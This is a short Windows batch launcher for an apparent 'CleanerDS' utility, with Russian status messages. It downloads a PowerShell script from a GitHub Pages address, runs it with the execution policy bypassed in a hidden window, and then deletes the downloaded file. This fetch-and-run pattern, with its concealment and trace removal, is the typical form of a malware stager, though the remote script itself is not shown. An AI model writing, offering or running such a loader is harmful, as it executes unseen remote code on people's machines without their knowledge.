@echo off
chcp 65001 >nul

set "URL=https://cleands.github.io/cds/script.ps1"
set "PS_FILE=%TEMP%\CleanerDS_App.ps1"

echo [CleanerDS] Подключение к серверу и загрузка...

powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest '%URL%' -OutFile '%PS_FILE%' -UseBasicParsing"

if not exist "%PS_FILE%" (
    echo Ошибка: Не удалось загрузить скрипт.
    pause
    exit /b 1
)

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_FILE%"

del /f /q "%PS_FILE%" >nul 2>&1
exit
